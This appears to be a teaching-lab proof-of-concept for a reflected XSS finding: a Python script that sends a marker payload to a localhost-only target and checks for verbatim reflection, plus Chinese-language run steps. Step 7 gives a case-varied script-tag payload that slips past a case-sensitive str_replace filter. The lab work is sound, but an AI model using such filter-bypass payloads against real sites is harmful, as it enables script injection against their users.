poc.code: #!/usr/bin/env python3 """XSS-002 teaching-lab verification draft. Sends one GET request with an inert marker payload and reads the response back. The browser-execution step is separate and must be observed manually in a browser. Local targets only; no cookie reading, no exfiltration. """ import argparse import sys import urllib.error import urllib.parse import urllib.request MARKER = "LLM_LAB_XSS" PAYLOAD = '' class NoRedirect(urllib.request.HTTPRedirectHandler): def redirect_request(self, req, fp, code, msg, headers, newurl): raise urllib.error.HTTPError(req.full_url, code, "redirect refused", headers, fp) def build_url(base, path, param, value): url = base.rstrip("/") + "/" + path.lstrip("/") sep = "&" if urllib.parse.urlparse(url).query else "?" return url + sep + urllib.parse.urlencode({param: value}) def main(): parser = argparse.ArgumentParser(description="Reflected XSS request/readback draft for XSS-002") parser.add_argument("--base", default="http://127.0.0.1", help="lab base URL (local only)") parser.add_argument("--path", required=True, help="module route from the deployment; route is not present in the audited fragment") parser.add_argument("--param", default="name", help="GET parameter name, taken from the audited fragment") parser.add_argument("--cookie-file", default=None, help="file holding a Cookie header value for the lab session") args = parser.parse_args() parsed = urllib.parse.urlparse(args.base) if parsed.scheme not in ("http", "https") or parsed.hostname not in ("127.0.0.1", "localhost", "::1"): sys.exit("refusing non-local target: %s" % args.base) target = build_url(args.base, args.path, args.param, PAYLOAD) print("request: GET %s" % target) request = urllib.request.Request(target, method="GET") if args.cookie_file: with open(args.cookie_file, "r", encoding="utf-8") as handle: request.add_header("Cookie", handle.read().strip()) opener = urllib.request.build_opener(NoRedirect) try: with opener.open(request, timeout=10) as response: status = response.getcode() body = response.read().decode("utf-8", "replace") except urllib.error.HTTPError as err: print("http error: %s" % err.code) sys.exit(2) except urllib.error.URLError as err: print("connection error: %s" % err.reason) sys.exit(3) print("status: %s" % status) reflected = PAYLOAD in body print("payload reflected verbatim: %s" % reflected) print("marker literal present: %s" % (MARKER in body)) if reflected: print("next step: open the printed URL in the browser and watch the devtools console for %s" % MARKER) else: print("no verbatim reflection: record the exact response region before drawing any conclusion") if __name__ == "__main__": main()

parameters: base：靶场基址，默认 http://127.0.0.1，仅接受 localhost/127.0.0.1/::1
path：模块可达路由；审计片段未包含路由，必须由部署环境提供，不能套用其它样本路径
param：GET 参数名，固定为片段中的 name
cookie-file：可选，保存会话 Cookie 头的本地文件，不写入版本库、不在输出中打印
steps: 1) 确认外围处理器已按包含本片段的配置加载，且登录会话与难度分支与实测环境一致。

2) 先不带载荷访问同一路由，记录正常页面中 
Hello ...
区域的基线文本。
3) 运行脚本：python xss002_draft.py --base http://127.0.0.1 --path <实测路由> --param name --cookie-file <cookie文件>。
4) 脚本以 GET 提交载荷 '
5) 在浏览器中打开脚本打印的同一 URL（会话已登录），打开开发者工具 Console。

6) 观察 Console 是否出现 LLM_LAB_XSS，以及响应中 
Hello ...
内是否原样保留未编码的载荷。
7) 若需第二个变体，使用 <ScRiPt>console.log('LLM_LAB_XSS')</ScRiPt>：str_replace 大小写敏感，该标签不被移除。
8) 结束后无需清理：该路径为反射型，不写入数据库；如页面允许存储则改用专用留言并删除该条。
